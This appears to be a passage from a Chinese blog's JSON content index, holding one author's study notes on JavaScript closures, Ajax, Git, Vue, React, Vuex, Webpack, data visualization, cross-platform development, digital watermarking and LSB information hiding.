&#125;,\n        value:function()&#123;\n            return privateCounter;\n        &#125;\n    &#125;;\n&#125;)();\n\nconsole.log(counter.value());\nconsole.log(counter.increment());\nconsole.log(counter.increment());\nconsole.log(counter.increment());\nconsole.log(counter.increment());\nconsole.log(counter.value());\n\n\n模拟块作用域\n\n\n\nonclick绑定的function中没有变量i，解析引擎会寻找父级作用域，最终找到全局变量i；for循环结束的时，i的值已经变成了4；所以此时任何onclick点击都会弹出4；\n也可使用let i=0;来解决；\n\nvar elements=document.getElementsByTagName('li');\nvar length=elements.length;\n\nfor(var i=0;i&lt;length;i++)&#123;\n    elements[i].onclick=function(num)&#123;\n        return function()&#123;\n            console.log(num);\n        &#125;\n    &#125;(i);           //通过匿名闭包，把每次的i保存到一个变量中实现了效果\n&#125;\n\n\n实现迭代器\n\nfunction setup(x)&#123;\n    var i=0;\n    return function()&#123;\n        return x[i++];\n    &#125;;\n&#125;\nvar next=setup([1,2,3]);\nconsole.log(next);\nconsole.log(next);\nconsole.log(next);\n\n闭包优点：\n减少全局变量的定义，避免全局变量污染；\n能够读取函数内部的变量；\n内存中维护一个变量，用作缓存；\n\n闭包缺点：\n造成内存泄漏，闭包会使函数中的变量一致保存在内存中，内存消耗极大；\n\n解决方法：使用完毕以后设置为null；\n\n闭包可能在父函数外部，改变父函数内部的值；\n由于闭包设计跨作用域访问，会导致性能损失；\n\n解决方法：通过跨作用域变量存储在局部变量中，直接访问局部变量来减轻对执行素的的影响；\n9.如何实现原生ajax？\nAjax是异步的JS和XML，是一种在无需重新加载整个网页的情况下，更新部分网页的技术；\n\n\n创建XMLHttpRequest对象；\n\n\n老版本的浏览器用的ActiveX对象；\n现代浏览器使用XMLHttpRequest对象；\n\n\n向服务器发送请求；\n\nopen(method,url,async)\t\t&#x2F;&#x2F;请求类型，url位置，true同步\nsend（string）\t\t\t&#x2F;&#x2F;仅用于POST；\n\n\n服务器响应；\n\n\n1.responseText   字符串形式的数据响应；\n2.responseXML  XML形式的数据响应；\n\n\n判断是否成；\n\n\n1.onreadystatechange    存储函数，每当readystate属性改变时调用；\n2.readyState              存有XMLHttpRequest的状态；0初始化，1连接建立，2请求已接受，3请求处理中，4请求已完成；\n3.status            200 ok   404 Page not found;\n\n//原生Ajax\nfunction oriAjax(url,)&#123;\n    //判断浏览器版本\n    if(window.XMLHttpRequest)&#123;\n        var ajaxRequest=new XMLHttpRequest();\n    &#125;else&#123;\n        var ajaxRequest=new ActiveXObject(\"Microsoft.XMLHTTP\");\n    &#125;\n\n    ajaxRequest.open(\"GET\",url,true);\n\n    ajaxRequest.onreadystatechange=function()&#123;\n        if(ajaxRequest.readyState==4 &amp;&amp; ajaxRequest.status==200)&#123;\n            //更新dom结点\n            document.getElementById(\"myDiv\").innerHTML=ajaxRequest.responseText;\n        &#125;else&#123;\n            console.log(ajaxRequest.response);\n        &#125;\n    &#125;\n&#125;\n\n\n\n\n\n10.JS排序算法底层原理？sort（）数组长度小于22使用插入排序，大于22快排；\n11.nextTickGit相关https://worktile.com/kb/ask/20275.html\n1.常见命令流程#初始化仓库\ngit init  \n\n#切换到主分支\ngit checkout master\n\n#获取最新变更\ngit fetch origin\n\n#基于主分支创建dev分支\ngit checkout -b dev origin/master\n\n#添加到缓存\ngit add\n\n#提交到本地仓库\ngit commit -m \"备注\"\n\n#获取最新更新\ngit fetch origin\n\n2.其他指令#查看仓库状态\ngit status\n\n#将某个工作区的文件添加暂存区\ngit add filename   或 git add . 全部\n\n#查看工作区和暂存区差异\ngit diff 分支/id/\n\n#查看历史记录\ngit log\n\n#代码回滚\ngit reset HEAD^  \n\n#删除版本库文件\ngit rm filename\n\n#同步远程仓库\ngit push -u origin master\n\n#本地仓库推送到远程仓库\ngit remote add origin git@github.com:username/仓库名.git\n\n#克隆\ngit clone url\n\n#合并分支\ngit merge dev\n\n#删除分支\ngit branch -d dev\n\n\n\n\nNodeJS相关1.node流2.node如何写接口？3.express4.node常用模块VUE相关1.Vue生命周期\n\nbeforeCreate:实例初始化完成，props解析之后，data()和computed等选项处理之前立即调用；此时不能获得DOM结点；\ncreated：Vue实例已经创建，响应式数据、计算属性、方法和侦听器已经设置完成；但是由于没有挂载，依旧不能获得DOM结点；\nbeforeMount：组件内容被渲染拿到页面之前执行的函数，组件已经完成了其响应式状态的设置，但是还没有创建DOM结点；\nmounted：组件渲染之后自动执行，一般异步请求写这里；这个阶段数据和DOM都已经完成渲染；\nbeforeUpdate：数据变化的时候执行的函数，此时变化后的数据还未渲染到页面上；\nupdated：数据变化以后执行，变化的数据已经渲染到页面上；\nbeforeUnmount：当Vue应用被销毁时，自动执行的函数；\nunmounted：当vue应用销毁后，且DOM完全销毁之后自动执行；\n\n\n2.路由守卫3.组件通信有哪些？https://blog.csdn.net/longfan_/article/details/125324201\n\n一般分为如下关系：\n父子间通信；\n非父子间通信（兄弟，隔代）；\n\n\nprops / $emit\n\n\n父组件通过props的方式向子组件传递数据，而通过$emit子组件可以像父组件通信；\nprops只可以从上一级组件传递到下一级组件，即所谓的单向数据流，而且props只读，不可被修改，所有修改都会失效并警告；\n一、不应该在一个组组件内部改变prop，会破坏单向数据绑定；\n\n\n\n\n4.v-if与show区别5.VUE与React区别6.Vue DIff算法7.Vue如何实现监听？React相关1.类组件和函数组件\n函数组件\n\n\n使用JS函数创建的组件；\n首字母大写，React根据此区分组件和HTML元素；\n函数必须有返回值,不渲染内容需要返回null；\n\n//普通函数\nfunction Header()&#123;\n    return &lt;div>头部组件&lt;/div>\n&#125;\n//箭头函数\nconst Footer=()=>&#123;\n    return &lt;div>Rooter&lt;/div>\n&#125;\n\n\n\n\n类组件\n\n\n使用class语法创建的组件；\n首字母大写，必须继承React.Component父类；\n必须有render函数，返回UI结构，可返回null;\n\n状态组件：\n无状态组件不定义状态，没有组件生命周期，只负责渲染UI，Hooks出现后函数组件也可以有状态；性能较好；\n有状态组件可以定义自己的状态，拥有生命周期，能力更强；\n\n类组件问题：\n处理this问题：绑定箭头函数、bind，声明箭头函数\n\nimport &#123; Component &#125; from \"react\";\n \nclass App extends Component &#123;\n  // 状态\n  state = &#123;\n    count: 0,\n  &#125;;\n  // 事件处理函数\n  handleClick(e) &#123;\n    console.log(e)\n    console.log(this.state.count)\n  &#125;\n  render() &#123;\n    return (\n      &lt;>\n        &lt;div>计数器：&#123;this.state.count&#125;&lt;/div>\n        &lt;div>\n+          &lt;button onClick=&#123;(e)=>this.handleClick(e)&#125;>按钮&lt;/button>\n        &lt;/div>\n      &lt;/>\n    );\n  &#125;\n&#125;\nexport default App;\n\nimport &#123; Component &#125; from \"react\";\n \nclass App extends Component &#123;\n  // 状态\n  state = &#123;\n    count: 0,\n  &#125;;\n  // 事件处理函数\n  handleClick(e) &#123;\n    console.log(e)\n    console.log(this.state.count)\n  &#125;\n  render() &#123;\n    return (\n      &lt;>\n        &lt;div>计数器：&#123;this.state.count&#125;&lt;/div>\n        &lt;div>\n+          &lt;button onClick=&#123;this.handleClick.bind(this)&#125;>按钮&lt;/button>\n        &lt;/div>\n      &lt;/>\n    );\n  &#125;\n&#125;\nexport default App;\n\nimport &#123; Component &#125; from \"react\";\n \nclass App extends Component &#123;\n  // 状态\n  state = &#123;\n    count: 0,\n  &#125;;\n  // 事件处理函数\n+  handleClick = (e) => &#123;\n    console.log(e)\n    console.log(this.state.count)\n  &#125;\n  render() &#123;\n    return (\n      &lt;>\n        &lt;div>计数器：&#123;this.state.count&#125;&lt;/div>\n        &lt;div>\n          &lt;button onClick=&#123;this.handleClick&#125;>按钮&lt;/button>\n        &lt;/div>\n      &lt;/>\n    );\n  &#125;\n&#125;\nexport default App;\n\n\nsetState\n\n\nhandleClick = () => &#123;\n  // 修改数据\n  this.setState(&#123;\n    // key是要修改的数据名称，value是对应的新值\n    count: this.state.count + 1,\n  &#125;);\n&#125;;\nupdateList = () => &#123;\n  // 修改列表\n  this.setState(&#123;\n    list: [...this.state.list, '相机'],\n  &#125;);\n&#125;;\nupdateUser = () => &#123;\n  // 修改对象\n  this.setState(&#123;\n    user: &#123;\n      ...this.state.user,\n      name: 'tony',\n    &#125;,\n  &#125;);\n&#125;;\n\n\n相同点\n都可以接受属性，返回React元素；\n\n不同点\n编程思想不同，类组件需要创建实例，基于面向对象的编程方法，而函数式是基于函数式编程；\n内存占用不用：类组件需要创建并保存实例，会占用一定内存，函数组件不需要创建实例，可以节约内存占用；\n捕获特性：函数组件具有值捕获特性；\n状态：类组件有自己的实例，可以定义状态，而且可以修改状态更新组件，函数式组件以前没有状态，现在可以使用 useState 使用状态\n生命周期：类组件有自己完整的生命周期，可以在生命周期内编写逻辑，函数组件以前没有生命周期，现在可以使用 useEffect 实现类似生命周期的功能\n逻辑复用：类组件可以通过继承实现逻辑复用，但官方推荐组件优于继承，函数组件可以通过自定义 hooks 实现逻辑的复用\n跳过更新：类组件可以通过 shouldComponentUpdate 和 PureComponent 来跳过更新，而函数式组件可以使用 React.memo 来跳过更新\n发展前景：未来函数式组件将会成为主流，因为它可以更好的屏蔽 this 问题、规范和复用逻辑，更好的适合事件分片和并发渲染\n\n2.React Hook及其优化策略Webpack相关1.Webpack配置2.loader执行顺序3.html webpack plugin的作用计算机网络相关1.CDN的理解2.跨域问题：什么是跨域？如何解决？3.节流与防抖4.TCP和UDP区别，三次握手，阻塞重传5.http和https操作系统1.线程、进程网络安全相关1.DDOS2.Web相关漏洞原理算法相关Linux相关1.linux常用命令项目相关1.项目上线如何捕获异常？2.项目加载头花","slug":"前端面经","date":"2023-03-27T10:51:45.000Z","categories_index":"前端","tags_index":"笔记,面试笔记","author_index":"Martin"},{"id":"4895101f3675479202285ec0ba9daedf","title":"数据可视化","content":"数据可视化一、什么是数据可视化？\nAnything that converts data into a visual representation. \nCharts\\Graphs\\Maps\\Tables…\n\n1.数据可视化分类\n科学可视化：科学实验数据的直观展示；\n信息可视化：对抽象数据的直观展示；\n可视分析：对分析结果的直观展示，及交互式反馈，跨学科；\n\n2.为社么需要数据可视化？\n记录信息；\n分析推理；\n证实假设；\n交流思想；\n\n二、可视化设计原则和方法\n糟糕的可视化\n\n\n\n错误的可视化\n\n\n1.可视化设计原则\n能够正确的表达数据中的信息而不产生偏差与歧义；\n\n2.透视失真\n如果数字是由视觉元素表示的，那么他们应该与是视觉元素的感知程度成正比；\n使用清晰、详细和彻底的标签，以避免图形失真和含糊不清；\n\n\n\n绿色部分的数据小于蓝色部分，但是视觉上绿色接近于蓝色；\n\n3.图形设计&amp;数据尺度\n图形的每一部分都会产生对其的视觉预期；\n\n\n预期往往决定了眼睛实际看到的东西；\n错误的数据洞察，产生于在图形的某个地方不正确的视觉预期；\n\n\n\n数据的刻度分布不均匀；\n\n4.数据上下文\n\n数据范围显示不全，导致误解；\n\n5.可视化设计原则\n准确的展示数据\n节省笔墨\n节省空间\n消除不必要的无价值图形\n在最短的事件传达最多的信息\n\nData-ink Ratio\n数据墨水：可视化图形中不可擦除的核心部分；\n最大化数据墨水占比：可视化图形由墨水+空白区域构成；\n擦除数据墨水将会减少图形所传达的信息量；\n\n$$Data-ink-ratio=Data-ink/Total-ink-used-to-print-the-graphics$$\n\n6.视觉感知相对判断和视觉假象\n人类的视觉系统管擦的是变化而不是绝对值，且容易被边界吸引；\n\n格式塔学派\n整体决定了部分的性质，部分依从于整体；\n结构比元素重要，视觉形象首先作为统一的整体被认知；\n\n\n\n就近原则：视觉元素空间距离上相近时，人们倾向于归于一组；同理，将数据元素放在靠近的位置，可以突出关联性；\n\n\n\n相似原则：形状、大小、颜色等属性相似时更容易被看作是一个整体；\n\n\n\n连续性原则：观察师傅的时候回很自然的沿着物体的边界，将不连续的物体视为连续的整体；\n\n\n\n 闭合性原则：有些图形本身不是闭合的名单时主体倾向闭合；\n\n\n\n共势原则：如果一个对象中的一部分都向共同的方向去运动，那么共同的部分就容易被感知；\n\n\n\n对称性原则：堆成的数据视为同一组；\n图形与背景关系原则：大脑通常认为构图中最小的物体是图形，更大的是背景；相比于凹面，凸面与图形相关联更多；\n\n7.视觉编码\n将数据信息（属性+值）映射成可视化元素（可视化符号+视觉通道）的技术；\n\n1.可视化符号\n点、线、面表示元素\n闭包、连线表示关系\n\n2.视觉通道\n3.视觉编码的优先级\n三、可视化工具\nD3.js：最好的之一；\nVega：声明式的语言，可以用JSON描述可视化的视觉外观和交互行为；\nG2：图形语法库（没有图表类型的概念）\nEcharts（强图表类型）\n\n","slug":"数据可视化基础","date":"2023-03-27T10:51:45.000Z","categories_index":"前端","tags_index":"笔记,可视化","author_index":"Martin"},{"id":"9e5c5d85c6ecb493e815e549e0c2b04d","title":"跨端技术概述","content":"跨端技术概述一、跨端是什么？1.跨端背景\nPC端（Windows,Mac）\n移动端（iOS，Android）\nWeb端\nIoT端（车载设备，穿戴设备）\n\n2.常见痛点\n各端功能几乎一致，各端需要单独配置开发人员；\n开发、维护成本高；\n安卓、IOS发版周期长；\n…\n\n3.跨端技术方案目标\n研发效率要高：学习成本低、多端一致性高\n用户体验好：稳定性高、性能体验好\n动态化：支持动态化下发、满足日益增长的业务需要\n\n二、跨端技术介绍1.Hybrid\n基于WebView渲染，通过JS Bridge把一部分系统功能开放给JS调用；\n\n\n2.原生渲染\n通过JS开发，通过中间层桥接后使用原生组件来渲染UI界面；\n\nReact Native使用JS+react来开发跨平台的应用（不局限于Web页面）；\n\n3.自渲染方案\n利用Skia重新实现渲染管线，不依赖原生组件；\n\nFlutter一套代码库构建精美的、原生平台编译的多平台应用；\n\n\n4.小程序方案\n使用小程序DSL+JS开发，通过中间层桥接后调用原生能力，使用webview来渲染UI界面\n\n字节小程序时间管线\n\n5.方案比较\n三、基于小程序跨端实践1.开发步骤\n下载开发者工具\n开发、调试\n小程序上传\n\n2.性能优化优化意义\n留住用户\n提升转化率\n提升用户体验\n\n性能指标Loading--&gt;FP--&gt;LCP\n\n\n加载耗时\n取消率\n重启率\n卡死次数占比\nLCP到达率\n白屏率\n…\n\n优化手段\n四、总结Write Once、Run Anywhere！\n\n\n\n\n\n\n\n\n\n","slug":"跨端技术概述","date":"2023-03-27T10:51:45.000Z","categories_index":"前端","tags_index":"笔记,面试笔记","author_index":"Martin"},{"id":"d5f81ad13155fc328e81b1032965290d","title":"Vuex","content":"Vuex一、基础概念1.Vuex是什么？状态管理模式+库；采用集中式存储管理应用组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。\n2.状态管理模式举个栗子🌰\nconst Counter &#x3D; &#123;\n  &#x2F;&#x2F; 状态\n  data () &#123;\n    return &#123;\n      count: 0\n    &#125;\n  &#125;,\n  &#x2F;&#x2F; 视图\n  template: &#96;\n    &lt;div&gt;&#123;&#123; count &#125;&#125;&lt;&#x2F;div&gt;\n  &#96;,\n  &#x2F;&#x2F; 操作\n  methods: &#123;\n    increment () &#123;\n      this.count++\n    &#125;\n  &#125;\n&#125;\n\ncreateApp(Counter).mount(&#39;#app&#39;)\n\n该APP包含以下部分：\n\n状态，驱动应用的数据源；\n视图，以声明方式将状态映射到试图；\n操作，响应在视图上的用户输入导致状态变化；\n\n\n\n存在一种多个视图依赖于同一种状态的情况；\n不同视图变更统一状态的情况；\n\n思路把组件的共享状态抽取出来，以一个全局单例模式管理；\n通过定义和隔离状态管理中的各种概念并通过强制规则维持视图和状态间的独立性，我们的代码将会变得更结构化且更易于维护；\n\n3.安装方法&lt;script src=\"/path/to/vue.js\">&lt;/script>\n&lt;script src=\"/path/to/vuex.js\">&lt;/script>\n\nnpm install vuex@next --save\n\n4. store基础如果有一部分的状态需要在多个组件实例间共享，可以使用reactive()来创建一个响应式对象，并将它导入到多个组件中。\n//store.js\nimport &#123; reactive &#125; from 'vue';\n\nexport const store=reactive(&#123;\n    count:0\n&#125;)\n\n&#x2F;&#x2F;componentA\n&lt;script&gt;\n\timport &#123; store &#125; from &#39;.&#x2F;store.js&#39;\n    \n    export default &#123;\n        data()&#123;\n            return&#123;\n                store,\n            &#125;\n        &#125;\n    &#125;\n&lt;&#x2F;script&gt;\n\n&lt;template&gt;\nFrom A:&#123;&#123; store.count &#125;&#125;\n&lt;&#x2F;template&gt;\n\n&#x2F;&#x2F;componentB\n&lt;script&gt;\n\timport &#123; store &#125; from &#39;.&#x2F;store.js&#39;\n    \n    export default &#123;\n        data()&#123;\n            return&#123;\n                store,\n            &#125;\n        &#125;\n    &#125;\n&lt;&#x2F;script&gt;\n\n&lt;template&gt;\nFrom B:&#123;&#123; store.count &#125;&#125;\n&lt;&#x2F;template&gt;\n\n现在，所有引入了store的组件都可以改动count，但是从长远看这种代码是不容易维护的。\n解决方法：在store上定义方法，方法的名字需要能表达意图；\n//store.js\nimport &#123; reactive &#125; from 'vue';\n\nexport const store=reactive(&#123;\n    count:0，\n    increment()&#123;\n    \tthis.count++\n\t&#125;,\n&#125;)\n\n&lt;template&gt;\n  &lt;button @click&#x3D;&quot;store.increment()&quot;&gt;\n    From B: &#123;&#123; store.count &#125;&#125;\n  &lt;&#x2F;button&gt;\n&lt;&#x2F;template&gt;\n\n4.SSR（Server-Side Rendering）服务端渲染\n默认情况下，Vue 组件的职责是在浏览器中生成和操作 DOM。然而，Vue 也支持将组件在服务端直接渲染成 HTML 字符串，作为服务端响应返回给浏览器，最后在浏览器端将静态的 HTML“激活”(hydrate) 为能够交互的客户端应用。 \n\n优点\n更快的首屏加载：服务端渲染的 HTML 无需等到所有的 JavaScript 都下载并执行完成之后才显示，所以你的用户将会更快地看到完整渲染的页面。数据获取过程在首次访问时在服务端完成，相比于从客户端获取，可能有更快的数据库连接。\n统一的心智模型\n更好的SEO：搜索引擎爬虫可以直接看到完全渲染的页面。\n\n二、使用1.最简单的storeimport &#123; createApp &#125; from 'vue'\nimport &#123; createStore &#125; from 'vuex'\n\n// 创建一个新的 store 实例\nconst store = createStore(&#123;\n  state () &#123;\n    return &#123;\n      count: 0\n    &#125;\n  &#125;,\n  mutations: &#123;\n    increment (state) &#123;\n      state.count++\n    &#125;\n  &#125;\n&#125;)\n\nconst app = createApp(&#123; /* 根组件 */ &#125;)\n\n// 将 store 实例作为插件安装\napp.use(store)\n\n\n\n\n\n","slug":"Vuex","date":"2023-03-27T07:18:45.000Z","categories_index":"前端","tags_index":"笔记,VUE","author_index":"Martin"},{"id":"51d3872cd56d489d412dadd4338316da","title":"Vue笔记","content":"Webpack知识体系\n理解前端工程话概念、工具、目标；\n团队需要有人熟悉webpack；\n高阶前端必经之路；\n\n一、什么是webpack?1.前端项目构成\n多媒体文件\nCSS\nJS\nHTML\nVUE\n\n手动管理\n比如引入50个js文件，操作过程繁琐；\n当代码文件之间有依赖时，得严格依赖顺序书写；\n开发与生产环境一致，很呐接入TS或JS新特性；\n比较难接入Less、Sass等工具；\nJS、图片、CSS资源管理模型不一致；\n\n2.常见工程化工具\nWebpack\nVite\nRollupJS\n\n3. Webpack功能\n多份资源文件打包成Bundle；\n支持Babel、Eslint、TS、CoffeeScript、Less、Sass；\n支持模块化处理CSS、图片等资源文件；\n支持HMR+开发服务器；\n支持持续监听、持续构建；\n支持代码分离；\n支持Tree-shaking;\n支持Sourcemap；\n\n二、Webpack1.示例Setp1.安装webpack\nnpm i -D webpack webpack-cli\n\nSetp2.编辑配置文件 webpack.config.jsconst path=require('path');\n\nmodule.exports=&#123;\n    entry:'./src/index',\t//定义当前项目的入口\n    mode:\"development\",\n    devtool:false,\n    output:&#123;\n        filename:'[name].js',\t\t\t//定义打包后文件的名称；\n        path:path.join(_dirname,'./dist')\n    &#125;\n&#125;\n\nStep3.执行编译命令\nnpx webpack\n\n\n打包到./dist/main.js\n\n2.核心流程\n入口处理：从entry文件开始，启动编译流程；\n以来解析：从entry开始，根据‘require’ or ‘import’ 等语句找到依赖资源；\n资源解析：更具‘module’配置，调用资源转移器，将png、css等非标准js资源转译为js内容；（如何实现？？）\n资源合并打包：将转译后的资源内容合并打包为可直接在浏览器运行的js文件；\n\n3.总结\n多文件资源合成一个，减少http请求；\n支持模块化开发；\n支持高级JS特性；\n支持TS，CofferScript；\n…\n\n三、使用Webpack–流程类\n1.配置文件Webpack的使用基本都围绕“配置”展开，而这些配置大致可以分为两类：\n\n流程类：作用于流程中的某个或多个环节，直接影响打包效果的配置项；\n\n\n\n工具类：主流程之外，提供更多工程化能力的配置项；\n\n2.必须配置\n在一个项目配置里面，至少需要entry和output\n\nconst path=require('path');\n\nmodule.exports=&#123;\n    entry:'./src/index',\t//定义当前项目的入口\n    output:&#123;\n        filename:'[name].js',\t\t\t//定义打包后文件的名称；\n        path:path.join(_dirname,'./dist')\n    &#125;\n&#125;\n\n3.处理CSS\n安装loader\n\nnpm add -D css-loader style-loader\n\n\n添加module处理css文件\n\nconst path=require('path');\n\nmodule.exports=&#123;\n    entry:'./src/index',\t//定义当前项目的入口\n    output:&#123;\n        filename:'[name].js',\t\t\t//定义打包后文件的名称；\n        path:path.join(_dirname,'./dist')\n    &#125;，\n    module:&#123;\n    \t//css处理器\n    \trules:[&#123;\n            test:/\\.css$/,\t\t\t\t//css文件名过滤条件，满足即处理\n            use:[\t\t\t\t\t\t//使用怎样的loader去处理\n            \"style-loader\",\n            \"css-loader\"\n            ]\n        &#125;]\n\t&#125;\n&#125;\n\n\n引入\n\nconst styles=requrie(\"./index.css\");\n\nimport styles from './index.css';\n\nloader有什么用？与旧时代html中维护css相比，使用loader有什么优劣？如何在webpack接入Less，Sass，Stylus等？4.接入Babel\n将ES6代码转译为ES5，向下兼容；\n\n\n安装依赖\n\nnpm i -D @babel/core @babel/preset-env babel-loader\n\n\n声明产物出口output\n\nconst path=require('path');\n\nmodule.exports=&#123;\n    entry:'./src/index',\t//定义当前项目的入口\n    output:&#123;\n        filename:'[name].js',\t\t\t//定义打包后文件的名称；\n        path:path.join(_dirname,'./dist')\n    &#125;，\n    module:&#123;\n    \t//css处理器\n    \trules:[&#123;\n           \t\ttest:/\\/js$/,\n    \t\t\tuser:[\n    \t\t\t\t\tloader:'babel-loader',\n    \t\t\t\t\toptions:&#123;\n    \t\t\t\t\t\t\tpresets:[\n    \t\t\t\t\t\t\t['@babel/preset-env']\n                                ]\n                            &#125;\n                     ]\n            ]\n        &#125;]\n\t&#125;\n&#125;\n\n\n执行npx webpack\n\n问题\nBabel具体由什么功能？\nBabel与Webpack分别解决了什么问题？为何两者能协作到一块儿？\n\n5.生成HTML\n自动生成HTML文件；\n\n\n安装依赖\n\nnpm i -D html-webpack-plugin\n\n\n声明产物出口output\n\nconst path=require('path');\n\nmodule.exports=&#123;\n    entry:'./src/index',\t//定义当前项目的入口\n    output:&#123;\n        filename:'[name].js',\t\t\t//定义打包后文件的名称；\n        path:path.join(_dirname,'./dist')\n    &#125;，\n    plugins:[new HtmlWebpackPlugin()]\n&#125;;\n\n\n执行npx webpack\n\n问题\n相比于手工维护HTML内容，这张方式有什么优缺点？\n\n四、使用web pack–工具类1. HMR Hot Module Replacement\n模块热替换，写完的代码能立刻更新到页面；\n\n\n开启HMR\ndevServer:&#123;\n\thot:true,\n\topen:true\n&#125;,\nmodule:&#123;\n    \n&#125;,\nwatch:true\n启动Webpack\n\n\nnpx webpack serve\n\n2.Tree-shaking\n删除没有使用到的代码\n\n\nDead Code：代码没有被用到，不可到达；代码的执行结果不会被用到；代码只读不写；\nTree-shaking：模块导出了但是没被使用；\n\nmode:\"production\",\noptimization:&#123;\nusedExports:true,\n&#125;\n\n五、其他工具\n缓存\nSourcemap\n性能监控\n日志\n代码压缩\n分包\n…\n\n六、理解Loader1.Webpack只认识JS\n为了处理非标准JS资源，设计出资源翻译模块—Loader\n用于将资源翻译为标准JS\n\n2.使用loader\n安装依赖\n\nnpm add -D css-loader style-loader less-loader\n\n\n添加module处理css文件\n\n3.认识loader：链式调用\nless-loader：将less=&gt;css;\ncss-loader：将css包装成类似module.exports=”${css}”的内容，包装后的内容符合JS语法；\nstyle-loader：将css模块包进require语句，并在运行时调用injectStyle等函数将内容注入到页面的style标签；\n\n\n4.loader特点\n链式执行；\n支持异步执行；\n分normal、patch两种模式；\n\n5.常见loader\n问题\nLoader是什么？要求的输出是什么？\nLoader的链式调用是什么意思？如何串联多个loader？\nLoader中如何处理异步场景？\n\n七、理解插件\n很多知名工具，如vscode、chrome、vue等都涉及了所谓的“插件架构“为什么？\n\n\n心智成本高=&gt;可维护性低=&gt;生命力弱\n插件架构精髓：对拓展开发，对修改封闭；\nWebpack很多功能都是基于插件的概念实现；\n\n1.使用插件//引入插件\nconst DashboardPlugin=require('webpack-dashboard/plugin');\n\nmodule.exports=&#123;\n    //添加插件实例\n    plugins:[new DashboardPlugin()];\n&#125;;\n\n2.编写插件钩子class SomePlugin&#123;\n    apply(complier)&#123;\n        complier.hooks.thisCompilation.tap('SomePlugin',(compilation)=>&#123;\n            \n        &#125;)\n    &#125;\n&#125;\n\n\n时机：编译过程的特定节点，webpack会以钩子的形式通知插件此刻正在发生什么事；\n上下文：通过tapable提供的回调机制，以参数的方式传递上下文信息；\n交互：在上下文参数对象中附带了很多存在side effect 的交互接口，插件可以通过这些接口改变；\n\n问题\nLoader与插件有什么区同点？\n钩子有什么作用？如何监听钩子函数？\n\n八、学习方法\n\n","slug":"Webpack体系","date":"2022-11-11T18:51:45.000Z","categories_index":"前端","tags_index":"笔记,VUE","author_index":"Martin"},{"id":"4dfb251717ac84fb0a3aa43b49610c5f","title":"数字水印","content":"数字水印一、基本原理1.背景信息隐藏：  伪装通信、隐秘传输；\n数字水印：  版权保护；\n区别：\n\n\n\n\n信息隐藏\n数字水印\n\n\n\n目标\n隐藏信息\n承载标记\n\n\n精准度\n精确\n不需要\n\n\n健壮\n一般\n强\n\n\n特点：永久嵌入在其他数据中，提供鉴别的信号或模式，并不影响宿主数据的可用性；安全、可证明、不可感知、健壮\n2.健壮性衡量量\n数据压缩处理\n滤波、平滑处理\n量化和增强\n几何失真\n\n算法组成水印的加载（打标记）   水印的检测（检测标记）\n组成水印：（1）有效信息；（2）随机序列；\n模型$$W’=F(I,W,K)        W’是水印本体；I是载体；$$\n$$Iw=E(I,W’)    嵌入$$\n$$W*=D(Iw,I,K)    提取过程$$\n3.假设检验原则虚警率：不存在但是被检测出来\n漏检率：存在但是没有检测出来（Better Small）\n总错误率=虚警率+漏检率\n4.分类载体上：\n静止图像水印\n视频水印\n音频水印\n软件水印\n文档水印\n\n外观上\n可见\n不可见\n\n加载方法上\n空间域水印：（1）最低有效位方法（2）拼凑方法（3）文档结构微调法\n变换域水印：（1）DCT变换（2）DFT变换（3）DWT变换\n\n检测方法分类私有和公开水印；私钥和公钥水印；\n特性上健壮性：标志保护；        脆弱性：完整性保护；\n使用目的上版权标识水印：版权认证标识；\n数字指纹水印：防止非法拷贝；\n5.失真度衡量方法主观性能：等级划分；\n客观性能：平均绝对差分；        信噪比 SNR   峰值信噪比 PSNR\n二、数字水印1.数字水印本体要求能够验证；鲁棒性；\n表示形式\n一窜有意义的字符；\n一窜伪随机序列；\n一个可视图片；\n\n（1）有意义字符方式包括所有者信息，创作日期，发行部分等相关信息；明文，需要纠错编码，健壮性差；\n（2）伪随机数列标识信息与伪随机数列对应；对伪随机序列进行嵌入；\n提取端通过相关性检测判断水印存在与否；鲁棒性好；\n（3）可是图像的数字水印签名，特定pic，人眼主观鉴定，误码容忍性强；鲁棒性好；\n2.数字水印框架$$嵌入 –&gt; 提取（提取的结果可以是水印本身，也可以是相关判决）$$\n\n三、基于空间域的图像水印关键算法1.最低有效位替换的数字水印嵌入方法\n2.图像拼凑数字水印方法–嵌入位置选择安全性考虑、载体质量的影响考虑；\n拼凑算法嵌入位置选择\nK密钥-&gt;伪随机数-&gt;选择n个像素对；a类+1，而b类-1；计算S=Σ(a-b);如果S=2n,则判断嵌入1，如果等于0，嵌入0；\n\n3.基于心理视觉的嵌入位置选择多在纹理复杂，或者边缘地区嵌入；\n（1）P18\n","slug":"数字水印","date":"2022-10-29T07:09:01.000Z","categories_index":"数字水印","tags_index":"数字水印","author_index":"Martin"},{"id":"0f623956fafb0472df452b34429c8c33","title":"图像信号处理基础","content":"图像信号处理基础一、图像信号基础1.图像表示像素点\n2.图像压缩方法JPEG等；\n\n3.常用图像处理方法\n二维DFT\n二维DWT\n二维DCT\n\n二、信息隐藏基本原理1.信息隐藏概念不可视通信，阈下通信$$C 载体对象；M 秘密信息； C’伪装对象；$$\n纯粹安全性：第三方有没有能力将载体对象和伪装对象区分；\n2.载体选择冗余空间、声音图像、载体样本使用次数仅1；\n三、信息隐藏技术（一）时域替换技术1.LSB替换方法将样点的最低比特位进行替换；\n替换规则\n同步\n抗干扰$$载体空间{j1,j2.j3…jL(c)},L(c)是载体长度$$\n$$嵌入信息空间{m1,m2,…,mL(m)}, L(c)是载体长度$$\n$$伪装载体空间{j’1,j’2,…,j’L(c’)}   。。。载体长度$$\n算法步骤：（1）嵌入过程\n\n根据L(m)值选择载体子集；\n将载体子集的每个元素的最低比特位用mi替换；\n\n（2）提取过程\n\n找到位置，提取出来，重新排列成mi\n\n嵌入点选择\n连续方法；\n随机间隔；\n伪随机置换法：共享ket，生成索引序列，将k处的mk隐藏带jk上；如果重复，则选择下一个；\n\n算法分析优点：简单易于实现，隐藏容量打；\n缺点：安全性不强，鲁棒性不高；不能抵抗有损压缩，滤波，加噪等手段；\n改进：安全性方面对m进行加密处理；鲁棒性方面，多次重复嵌入，增加冗余，或者加上纠错编码；\n2.调色板图像隐藏方法图像的组成直接像素；    